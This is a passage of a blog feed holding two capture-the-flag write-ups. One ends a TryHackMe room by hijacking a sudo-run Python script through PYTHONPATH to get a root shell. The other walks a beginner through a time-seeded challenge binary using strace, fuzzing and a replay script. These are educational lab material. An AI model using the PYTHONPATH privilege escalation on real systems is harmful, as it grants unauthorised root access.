&lt;p&gt;There are a few directories that all users should always have access to such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; that we could write to, but we don‚Äôt need to worry about having to do this because we are a user with a home directory, so we are able to write here&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ export PYTHONPATH=/home/wes; echo &quot;import os&quot; &amp;gt; compare.py; echo &quot;os.system('/bin/bash')&quot; &amp;gt;&amp;gt; compare.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So with this, we have set the environment variable such that python will read the &lt;code class=&quot;highlighter-rouge&quot;&gt;compare.py&lt;/code&gt; file from the user &lt;code class=&quot;highlighter-rouge&quot;&gt;wes&lt;/code&gt;‚Äôs home directory. Then we have some code in this file that should start a shell. Because this would be running as root we would get a root shell :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wes@ubuntu-xenial:~$ sudo /usr/bin/python3 /opt/development/test_module.py

id    
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we got a shell, but it doesn‚Äôt look very nice. If we wanted to spawn a TTY shell we could have used the &lt;code class=&quot;highlighter-rouge&quot;&gt;pty&lt;/code&gt; module in python, not that it matters now that we have root.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root/root.txt
JPC{do it yourself}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome :) This was a nice room&lt;/p&gt;</content><author><name>JamBot</name></author><category term="thm" /><category term="pentesting" /><summary type="html">Explanation</summary></entry><entry><title type="html">Cool binary reversing stuff</title><link href="http://localhost:4000/blog/misc-binexp-writeup" rel="alternate" type="text/html" title="Cool binary reversing stuff" /><published>2021-01-10T00:00:00+00:00</published><updated>2021-01-10T00:00:00+00:00</updated><id>http://localhost:4000/blog/bx01</id><content type="html" xml:base="http://localhost:4000/blog/misc-binexp-writeup">&lt;h2 id=&quot;what&quot;&gt;What?&lt;/h2&gt;

&lt;p&gt;Okay so uh lemme explain where I‚Äôve been- basically I haven‚Äôt posted any blogs lately due to working on some cool projects and some health issues. I‚Äôve been spending a ton of time developing a HTB machine that I hope is going to end up in use on the site (this would be rly epic for me ngl). I‚Äôve also been working on a ton of other projects that I plan on blogging about. But yea, rn as of this date there aren‚Äôt any plans for GCSE exams to take place, so all my teachers are oversetting work and I‚Äôm having to keep up with that, working out, and my own projects- so it‚Äôs pretty hard finding the time to write blogs atm.`&lt;/p&gt;

&lt;p&gt;I won‚Äôt be hosting the file here (because I don‚Äôt think I‚Äôm allowed to) but uh contact me on discord @ &lt;code class=&quot;highlighter-rouge&quot;&gt;JamBot3000#5181&lt;/code&gt; and I‚Äôm sure we can figure something out :)&lt;/p&gt;

&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;

&lt;p&gt;Okay so, let‚Äôs outline some of the basic binexp stuff we want to do, sorry if this is a little basic- I just want it to be possible for someone new to binexp or reversing to be able to follow along:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Look for any sus calls, anything like a strcmp against a set variable would be a massive giveaway&lt;/li&gt;
  &lt;li&gt;Find weird strings, to get an idea of what data the binary could be using&lt;/li&gt;
  &lt;li&gt;See what is actually done with our input, so fuzz- and see what happens&lt;/li&gt;
  &lt;li&gt;Maybe play with it in a debugger- that way we can go through each individual assembly instruction and see what is done with our input, if anything.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Let‚Äôs start off, simply by running the binary- to find out what type of file it is, try the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command. This will read file headers aswell as other data to determine the correct type. In our case it‚Äôs an ELF 64 bit executable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot3000@pop-os:/tmp/bx01$ ls
bx01.zip  flag.txt  program
jambot3000@pop-os:/tmp/bx01$ chmod +x program 
jambot3000@pop-os:/tmp/bx01$ ./program 
Welcome to the Challenge &amp;amp; Auth Server
Please enter your challenge: Idk my G ask someone else
Secret is rFpHzJbcI.EnrFk..qnseKrsphyJlvCumJnEFoyrnoExfamIj
Your challenge was Idk my G ask someone else

The server challenge was rFpHzJbcI.EnrFk..qnseKrsphyJlvCumJnEFoyrnoExfamIj
Sorry, your challenge did not match the server
jambot3000@pop-os:/tmp/bx01$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay, so we made the file executable, and ran it with some input. We can also provide input by running it like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot3000@pop-os:/tmp/bx01$ echo &quot;Idk my G ask someone else&quot; | ./program 
Welcome to the Challenge &amp;amp; Auth Server
Please enter your challenge: Secret is IaEoJx.c.BjnalIxBzhBE.KGk.sdqDwcDmiqBhksAlFBwAkkd
Your challenge was test

The server challenge was IaEoJx.c.BjnalIxBzhBE.KGk.sdqDwcDmiqBhksAlFBwAkkd
Insufficient challenge length.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or we can make it read from a file using &lt;code class=&quot;highlighter-rouge&quot;&gt;./program &amp;lt; file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Anyways- let‚Äôs try understand what‚Äôs happening here. So, we gave the same input both times- but for whatever reason we recieved different output? That‚Äôs strange. So there must be some changing variable right?&lt;/p&gt;

&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;

&lt;p&gt;Let‚Äôs try see if it‚Äôs making any system calls. Normally I would use ltrace- to incercept d-lib function calls (basically seeing common functions being used. For example strcmp might show us our input is being compared against something). But we can‚Äôt actually do that here because this binary sees to be statically linked(ltrace only works for dynamically linked binaries afaik). But we don‚Äôt need to worry about what this means for now- let‚Äôs just run strace and look at some system calls:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot3000@pop-os:/tmp/bx01$ strace ./program 
execve(&quot;./program&quot;, [&quot;./program&quot;], 0x7ffd32cef6e0 /* 58 vars */) = 0
brk(NULL)                               = 0x2438000
brk(0x24391c0)                          = 0x24391c0
arch_prctl(ARCH_SET_FS, 0x2438880)      = 0
uname({sysname=&quot;Linux&quot;, nodename=&quot;pop-os&quot;, ...}) = 0
readlink(&quot;/proc/self/exe&quot;, &quot;/tmp/bx01/program&quot;, 4096) = 17
brk(0x245a1c0)                          = 0x245a1c0
brk(0x245b000)                          = 0x245b000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
write(1, &quot;Welcome to the Challenge &amp;amp; Auth &quot;..., 39Welcome to the Challenge &amp;amp; Auth Server
) = 39
write(1, &quot;Please enter your challenge: &quot;, 29Please enter your challenge: ) = 29
fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
read(0, THIS IS MY INPUT HELLO IT'S ME
&quot;THIS IS MY INPUT HELLO IT'S ME\n&quot;, 1024) = 31
time(NULL)                              = 1610022953 (2021-01-07T12:35:53+0000)
write(1, &quot;Secret is HEfpDBj.regIFAfDnrzmHH&quot;..., 60Secret is HEfpDBj.regIFAfDnrzmHHHaJvAwv.CgBHniuo. EseqjFnEKE
) = 60
write(1, &quot;Your challenge was THIS IS MY IN&quot;..., 50Your challenge was THIS IS MY INPUT HELLO IT'S ME
) = 50
write(1, &quot;\n&quot;, 1
)                       = 1
write(1, &quot;The server challenge was HEfpDBj&quot;..., 75The server challenge was HEfpDBj. regIFAfDnrzmHHHaJvAwv.CgBHniuo.EseqjFnEKE
) = 75
write(1, &quot;Sorry, your challenge did not ma&quot;..., 47Sorry, your challenge did not match the server
) = 47
exit_group(0)                           = ?
+++ exited with 0 +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay so yea- this seems a bit scary, but all we can still see sort of what it‚Äôs doing, even if we are just skimming over it. We can see there is a system ‚Äúwrite‚Äù call to stdout for our terminal output, and we can see after it read‚Äôes out input that there is a system call for the time. This time is taken from the CPU, and is very precise- it will be changing constantly.&lt;/p&gt;

&lt;p&gt;So, knowing this- we can make a mental note that maybe time is being used in some way here?&lt;/p&gt;

&lt;p&gt;There are a few other ways we probably could have figured this out- maybe using a debugger such as &lt;code class=&quot;highlighter-rouge&quot;&gt;GDB&lt;/code&gt; or &lt;a href=&quot;https://github.com/radareorg/radare2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Radare2&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Anyway- now at this point before we try some in depth, low level debugging, let‚Äôs just try fuzzing the binary - giving it a ton of different input to see how it reacts. You could do this a number of ways, the easiest would probably be some basic python or bash script- so let‚Äôs try that. There probably are some tools for this- but we‚Äôll only be doing some basic testing.&lt;/p&gt;

&lt;p&gt;Fuzzing is just giving a ton of random, unexpected inputs, in order to try to find bugs- maybe there are characters it doesnt expect. For example maybe an application blocks semicolons because it passes something into a system command. That would let us know that this is a possibility, so we could try using 2 &amp;amp; signs instead. This isn‚Äôt relevant here, but it‚Äôs always good to try.&lt;/p&gt;

&lt;p&gt;For now let‚Äôs just try seeing if we can cause a buffer overflow by giving too much input.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;|./program&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here is a super basic python script that simply gives different amounts of input- and prints the amount it gave. Could definitely make something better, but this is just something to quickly test if there is a buffer overflow, and if so how many characters are needed to cause it.&lt;/p&gt;

&lt;p&gt;So, after running this we can see that there is no buffer overflow- probably because the variable our input is saved to has a limit of 49 characters as shown. If anymore than this are given- it is not reflected in the output.&lt;/p&gt;

&lt;p&gt;But.. ignoring this- something much more interesting is here. There are some repeats in the output?? Ontop of this, they are repeats despite having different inputs. Strange- maybe our input doesnt matter?&lt;/p&gt;

&lt;p&gt;Anyway, repeat outputs are great, because supposedly that‚Äôs what the program wants, so if we can generate a correct output again somehow- then that‚Äôs the challenge done. So let‚Äôs try to trigger this again? Because every so often the output changes to be the same thing- I would assume that it is changing every second. Let‚Äôs test this by just spamming input lol.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot3000@pop-os:/tmp/bx01$ echo &quot;lol&quot; | ./program 
Welcome to the Challenge &amp;amp; Auth Server
Please enter your challenge: Secret is FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb
Your challenge was lol

The server challenge was FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb
Insufficient challenge length.
jambot3000@pop-os:/tmp/bx01$ echo &quot;lol&quot; | ./program 
Welcome to the Challenge &amp;amp; Auth Server
Please enter your challenge: Secret is FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb
Your challenge was lol

The server challenge was FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb
Insufficient challenge length.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;making-an-exploit&quot;&gt;Making an exploit&lt;/h3&gt;

&lt;p&gt;After this &lt;strong&gt;extremely advanced reconnaissance technique&lt;/strong&gt; we can tell that it‚Äôs changing every second. The actual amount of time doesnt matter- so long as there is enough time for us to generate the same output twice it‚Äôs fine.&lt;/p&gt;

&lt;p&gt;So, let‚Äôs try automating this process with a python or bash script, personally I prefer to use python scripts , especially in writeups because they are easier to read and modify, both for myself and others. You don‚Äôt need to &lt;strong&gt;know&lt;/strong&gt; python to use it- whereas bash is a lot of pretty specific stuff.&lt;/p&gt;

&lt;p&gt;So, all we wanna do is:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Run the binary with a random input&lt;/li&gt;
  &lt;li&gt;Save the output to a variable&lt;/li&gt;
  &lt;li&gt;Find the secret(weird string binary wants) inside of a variable&lt;/li&gt;
  &lt;li&gt;Run the binary again, this time with the correct secret as the input&lt;/li&gt;
  &lt;li&gt;???&lt;/li&gt;
  &lt;li&gt;Profit&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Cool, so here‚Äôs the script that I used:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo 'Aylmaoooo' | ./program&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server challenge was&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#got the secret
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; | ./program&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the output from running this is‚Ä¶&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot3000@pop-os:/tmp/bx01$ python3 otherscript.py 
Welcome to the Challenge &amp;amp; Auth Server
Please enter your challenge: Secret is If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A
Your challenge was If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A
The server challenge was If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A

THIS IS A PLACEHOLDER FLAG - SUBMIT THE SOLUTION TO THE NETWORK SERVICE TO GET THE REAL FLAG.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, so we know it works- so if we assume that we aren‚Äôt being lied to by the flag- then all we have to do is convert this to work with open tcp port.&lt;/p&gt;

&lt;p&gt;We could do this with python sockets, we could make a bash script like the one created by sockmower- or we could just change all instances of &lt;code class=&quot;highlighter-rouge&quot;&gt;./program&lt;/code&gt; in our current script to &lt;code class=&quot;highlighter-rouge&quot;&gt;nc ip port&lt;/code&gt; and it should work absolutely fine.&lt;/p&gt;

&lt;p&gt;There is a lot more that could have been explored with this- for example before I got to the actual solution I spent &lt;strong&gt;way&lt;/strong&gt; too much time trying to debug using R2 and (attempting to) read the assmelby of some random functions- with varying results lol. The binary itself is quite big- in fact if you run strings on it, you will see a ton of random information- I actually still don‚Äôt know why a lot of it was in there, maybe to mess with more experienced binexp people (not that I‚Äôm one lmao) who are used to immeditaley opening the binary, and then debugging until they understand it enough to craft an exploit. But yeah, I‚Äôm not amazing at binexp- in fact it‚Äôs probably my worst area of cyber. This challenge was less about in depth, low-level binary exploitation, and more about how to approach a challenge.&lt;/p&gt;

&lt;p&gt;Anyway, I hope this writeup has helped :)&lt;/p&gt;

&lt;p&gt;-JamBot&lt;/p&gt;</content><author><name>JamBot</name></author><category term="tutorial" /><category term="misc" /><category term="crackme" /><summary type="html">What? Okay so uh lemme explain where I‚Äôve been- basically I haven‚Äôt posted any blogs lately due to working on some cool projects and some health issues. I‚Äôve been spending a ton of time developing a HTB machine that I hope is going to end up in use on the site (this would be rly epic for me ngl). I‚Äôve also been working on a ton of other projects that I plan on blogging about. But yea, rn as of this date there aren‚Äôt any plans for GCSE exams to take place, so all my teachers are oversetting work and I‚Äôm having to keep up with that, working out, and my own projects- so it‚Äôs pretty hard finding the time to write blogs atm.` I won‚Äôt be hosting the file here (because I don‚Äôt think I‚Äôm allowed to) but uh contact me on discord @ JamBot3000#5181 and I‚Äôm sure we can figure something out :) Writeup Okay so, let‚Äôs outline some of the basic binexp stuff we want to do, sorry if this is a little basic- I just want it to be possible for someone new to binexp or reversing to be able to follow along: Look for any sus calls, anything like a strcmp against a set variable would be a massive giveaway Find weird strings, to get an idea of what data the binary could be using See what is actually done with our input, so fuzz- and see what happens Maybe play with it in a debugger- that way we can go through each individual assembly instruction and see what is done with our input, if anything. Enumeration Let‚Äôs start off, simply by running the binary- to find out what type of file it is, try the file command. This will read file headers aswell as other data to determine the correct type. In our case it‚Äôs an ELF 64 bit executable. jambot3000@pop-os:/tmp/bx01$ ls bx01.zip flag.txt program jambot3000@pop-os:/tmp/bx01$ chmod +x program jambot3000@pop-os:/tmp/bx01$ ./program Welcome to the Challenge &amp;amp; Auth Server Please enter your challenge: Idk my G ask someone else Secret is rFpHzJbcI.EnrFk..qnseKrsphyJlvCumJnEFoyrnoExfamIj Your challenge was Idk my G ask someone else The server challenge was rFpHzJbcI.EnrFk..qnseKrsphyJlvCumJnEFoyrnoExfamIj Sorry, your challenge did not match the server jambot3000@pop-os:/tmp/bx01$ Okay, so we made the file executable, and ran it with some input. We can also provide input by running it like this: jambot3000@pop-os:/tmp/bx01$ echo &quot;Idk my G ask someone else&quot; | ./program Welcome to the Challenge &amp;amp; Auth Server Please enter your challenge: Secret is IaEoJx.c.BjnalIxBzhBE.KGk.sdqDwcDmiqBhksAlFBwAkkd Your challenge was test The server challenge was IaEoJx.c.BjnalIxBzhBE.KGk.sdqDwcDmiqBhksAlFBwAkkd Insufficient challenge length. Or we can make it read from a file using ./program &amp;lt; file. Anyways- let‚Äôs try understand what‚Äôs happening here. So, we gave the same input both times- but for whatever reason we recieved different output? That‚Äôs strange. So there must be some changing variable right? Analysis Let‚Äôs try see if it‚Äôs making any system calls. Normally I would use ltrace- to incercept d-lib function calls (basically seeing common functions being used. For example strcmp might show us our input is being compared against something). But we can‚Äôt actually do that here because this binary sees to be statically linked(ltrace only works for dynamically linked binaries afaik). But we don‚Äôt need to worry about what this means for now- let‚Äôs just run strace and look at some system calls: jambot3000@pop-os:/tmp/bx01$ strace ./program execve(&quot;./program&quot;, [&quot;./program&quot;], 0x7ffd32cef6e0 /* 58 vars */) = 0 brk(NULL) = 0x2438000 brk(0x24391c0) = 0x24391c0 arch_prctl(ARCH_SET_FS, 0x2438880) = 0 uname({sysname=&quot;Linux&quot;, nodename=&quot;pop-os&quot;, ...}) = 0 readlink(&quot;/proc/self/exe&quot;, &quot;/tmp/bx01/program&quot;, 4096) = 17 brk(0x245a1c0) = 0x245a1c0 brk(0x245b000) = 0x245b000 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory) fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0 write(1, &quot;Welcome to the Challenge &amp;amp; Auth &quot;..., 39Welcome to the Challenge &amp;amp; Auth Server ) = 39 write(1, &quot;Please enter your challenge: &quot;, 29Please enter your challenge: ) = 29 fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0 read(0, THIS IS MY INPUT HELLO IT'S ME &quot;THIS IS MY INPUT HELLO IT'S ME\n&quot;, 1024) = 31 time(NULL) = 1610022953 (2021-01-07T12:35:53+0000) write(1, &quot;Secret is HEfpDBj.regIFAfDnrzmHH&quot;..., 60Secret is HEfpDBj.regIFAfDnrzmHHHaJvAwv.CgBHniuo. EseqjFnEKE ) = 60 write(1, &quot;Your challenge was THIS IS MY IN&quot;..., 50Your challenge was THIS IS MY INPUT HELLO IT'S ME ) = 50 write(1, &quot;\n&quot;, 1 ) = 1 write(1, &quot;The server challenge was HEfpDBj&quot;..., 75The server challenge was HEfpDBj. regIFAfDnrzmHHHaJvAwv.CgBHniuo.EseqjFnEKE ) = 75 write(1, &quot;Sorry, your challenge did not ma&quot;..., 47Sorry, your challenge did not match the server ) = 47 exit_group(0) = ? +++ exited with 0 +++ Okay so yea- this seems a bit scary, but all we can still see sort of what it‚Äôs doing, even if we are just skimming over it. We can see there is a system ‚Äúwrite‚Äù call to stdout for our terminal output, and we can see after it read‚Äôes out input that there is a system call for the time. This time is taken from the CPU, and is very precise- it will be changing constantly. So, knowing this- we can make a mental note that maybe time is being used in some way here? There are a few other ways we probably could have figured this out- maybe using a debugger such as GDB or Radare2 Anyway- now at this point before we try some in depth, low level debugging, let‚Äôs just try fuzzing the binary - giving it a ton of different input to see how it reacts. You could do this a number of ways, the easiest would probably be some basic python or bash script- so let‚Äôs try that. There probably are some tools for this- but we‚Äôll only be doing some basic testing. Fuzzing is just giving a ton of random, unexpected inputs, in order to try to find bugs- maybe there are characters it doesnt expect. For example maybe an application blocks semicolons because it passes something into a system command. That would let us know that this is a possibility, so we could try using 2 &amp;amp; signs instead. This isn‚Äôt relevant here, but it‚Äôs always good to try. For now let‚Äôs just try seeing if we can cause a buffer overflow by giving too much input. import os for i in range(300): os.system(f&quot;echo {'a' * i}|./program&quot;) print(&quot;\n&quot;, i, &quot;\n&quot;) Here is a super basic python script that simply gives different amounts of input- and prints the amount it gave. Could definitely make something better, but this is just something to quickly test if there is a buffer overflow, and if so how many characters are needed to cause it. So, after running this we can see that there is no buffer overflow- probably because the variable our input is saved to has a limit of 49 characters as shown. If anymore than this are given- it is not reflected in the output. But.. ignoring this- something much more interesting is here. There are some repeats in the output?? Ontop of this, they are repeats despite having different inputs. Strange- maybe our input doesnt matter? Anyway, repeat outputs are great, because supposedly that‚Äôs what the program wants, so if we can generate a correct output again somehow- then that‚Äôs the challenge done. So let‚Äôs try to trigger this again? Because every so often the output changes to be the same thing- I would assume that it is changing every second. Let‚Äôs test this by just spamming input lol. jambot3000@pop-os:/tmp/bx01$ echo &quot;lol&quot; | ./program Welcome to the Challenge &amp;amp; Auth Server Please enter your challenge: Secret is FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb Your challenge was lol The server challenge was FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb Insufficient challenge length. jambot3000@pop-os:/tmp/bx01$ echo &quot;lol&quot; | ./program Welcome to the Challenge &amp;amp; Auth Server Please enter your challenge: Secret is FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb Your challenge was lol The server challenge was FnIEJithjeewAr..tEfawcb.ljCIFscxG.ft.qA.vxu.atCtb Insufficient challenge length. Making an exploit After this extremely advanced reconnaissance technique we can tell that it‚Äôs changing every second. The actual amount of time doesnt matter- so long as there is enough time for us to generate the same output twice it‚Äôs fine. So, let‚Äôs try automating this process with a python or bash script, personally I prefer to use python scripts , especially in writeups because they are easier to read and modify, both for myself and others. You don‚Äôt need to know python to use it- whereas bash is a lot of pretty specific stuff. So, all we wanna do is: Run the binary with a random input Save the output to a variable Find the secret(weird string binary wants) inside of a variable Run the binary again, this time with the correct secret as the input ??? Profit Cool, so here‚Äôs the script that I used: import subprocess output = subprocess.getoutput(&quot;echo 'Aylmaoooo' | ./program&quot;) output = output.split(&quot;server challenge was&quot;) output = output[1].split(&quot;\n&quot;)[0] #got the secret print(subprocess.getoutput(f&quot;echo {output} | ./program&quot;)) And the output from running this is‚Ä¶ jambot3000@pop-os:/tmp/bx01$ python3 otherscript.py Welcome to the Challenge &amp;amp; Auth Server Please enter your challenge: Secret is If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A Your challenge was If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A The server challenge was If.tdnHGAFeBEqrijCulcwlbwBfhkyreDqxHwjriavCw.fE.A THIS IS A PLACEHOLDER FLAG - SUBMIT THE SOLUTION TO THE NETWORK SERVICE TO GET THE REAL FLAG. Awesome, so we know it works- so if we assume that we aren‚Äôt being lied to by the flag- then all we have to do is convert this to work with open tcp port. We could do this with python sockets, we could make a bash script like the one created by sockmower- or we could just change all instances of ./program in our current script to 